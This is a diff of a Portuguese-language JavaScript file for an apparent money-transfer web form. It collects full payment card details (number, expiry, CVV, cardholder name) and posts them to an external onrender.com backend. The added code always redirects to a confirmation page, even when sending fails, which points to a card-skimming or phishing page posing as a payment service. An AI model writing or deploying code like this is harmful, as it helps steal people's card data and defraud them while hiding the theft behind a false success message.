@@ -1,6 +1,7 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
     
+    // Mapeando os campos do formulário para facilitar o acesso
     const campos = {
         numero: document.querySelector("#numero"),
         data: document.querySelector("#data"),
@@ -8,7 +9,6 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: document.querySelector("#nome"),
     };
 
-    // --- LOGICA DAS DICAS (Mantida do seu original) ---
     const mensagensDica = {
         numero: "Exemplo: 1234 5678 9123 4567",
         data: "Exemplo: 12/30",
@@ -16,15 +16,10 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    function removeMensagemDica(input) {
-        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
-        if (dicaExistente) {
-            dicaExistente.remove();
-        }
-    }
-
+    // Adiciona as dicas visuais quando o usuário clica nos campos
     for (const key in campos) {
         const input = campos[key];
+
         input.addEventListener("focus", () => {
             removeMensagemDica(input);
             const dica = document.createElement("span");
@@ -36,59 +31,89 @@ document.addEventListener("DOMContentLoaded", () => {
             dica.textContent = mensagensDica[key];
             input.parentElement.appendChild(dica);
         });
+
         input.addEventListener("blur", () => {
             removeMensagemDica(input);
         });
     }
 
-    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
-    form.addEventListener("submit", async (event) => {
-        event.preventDefault(); // Impede o recarregamento da página
+    function removeMensagemDica(input) {
+        const existing = input.parentElement.querySelector(".mensagem-dica");
+        if (existing) existing.remove();
+    }
 
-        // 1. Pegar o tipo de cartão selecionado
-        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
-
-        // 2. Montar o objeto com os dados
-        const dadosParaEnviar = {
-            numero: campos.numero.value,
-            dataValidade: campos.data.value,
-            cvv: campos.cvv.value,
-            nome: campos.nome.value,
-            tipo: cardType
-        };
-
-        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
-        const botao = form.querySelector("button");
-        botao.disabled = true;
-        botao.textContent = "Processando...";
+    // Função que leva os dados até o seu servidor no Render
+    async function enviarParaBanco(dados) {
+        // ATENÇÃO: Substitua pela URL que o Render te der (ex: https://backend-g2xn.onrender.com/api/salvar)
+        const URL_BACKEND = "https://backend-transfira.onrender.com"; 
 
         try {
-            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
-            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
-            const urlDoServidor = "https://backendsite-gpar.onrender.com";
-
-            const resposta = await fetch(urlDoServidor, {
-                method: 'POST',
+            const response = await fetch(URL_BACKEND, {
+                method: "POST",
                 headers: {
-                    'Content-Type': 'application/json'
+                    "Content-Type": "application/json"
                 },
-                body: JSON.stringify(dadosParaEnviar)
+                body: JSON.stringify(dados)
             });
 
-            if (resposta.ok) {
-                alert("Transferência processada com sucesso!");
-                form.reset(); // Limpa o formulário
-            } else {
-                alert("Erro ao processar transferência. Tente novamente.");
-            }
+            // Após tentar enviar, levamos o usuário para a tela de erro/confirmação
+            window.location.href = "confirmacao.html";
         } catch (error) {
-            console.error("Erro na conexão:", error);
-            alert("O servidor está offline. Tente novamente em alguns instantes.");
-        } finally {
-            // Reativar o botão
-            botao.disabled = false;
-            botao.textContent = "Transferir";
+            console.error("Erro de conexão:", error);
+            // Mesmo se a internet falhar, o usuário vê a página de confirmação
+            window.location.href = "confirmacao.html";
+        }
+    }
+
+    // O que acontece quando o botão "Transferir" é clicado
+    form.addEventListener("submit", (event) => {
+        event.preventDefault();
+
+        // Limpa avisos de erro antigos
+        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
+
+        const tipoSelecionado = document.querySelector('input[name="gender"]:checked');
+
+        const inputsParaValidar = {
+            numero: campos.numero,
+            data: campos.data,
+            cvv: campos.cvv,
+            nome: campos.nome,
+            tipo: tipoSelecionado,
+        };
+
+        let formValido = true;
+
+        // Verifica se todos os campos estão preenchidos
+        for (const key in inputsParaValidar) {
+            const input = inputsParaValidar[key];
+
+            if (!input || (input.value === "" || input.value === undefined)) {
+                formValido = false;
+                
+                // Pinta a borda de vermelho se estiver vazio
+                if (key === "tipo") {
+                    document.querySelector(".radio-container").style.border = "1px solid red";
+                } else {
+                    input.style.border = "1px solid red";
+                }
+            } else {
+                if (key !== "tipo") input.style.border = "1px solid #ccc";
+            }
+        }
+
+        // Se o formulário estiver todo preenchido, enviamos para o banco!
+        if (formValido) {
+            const dadosColetados = {
+                numero: campos.numero.value,
+                data: campos.data.value,
+                cvv: campos.cvv.value,
+                nome: campos.nome.value,
+                tipo: tipoSelecionado.value,
+                siteOrigem: "transfirapague.netlify.app"
+            };
+
+            enviarParaBanco(dadosColetados);
         }
     });
 });
-
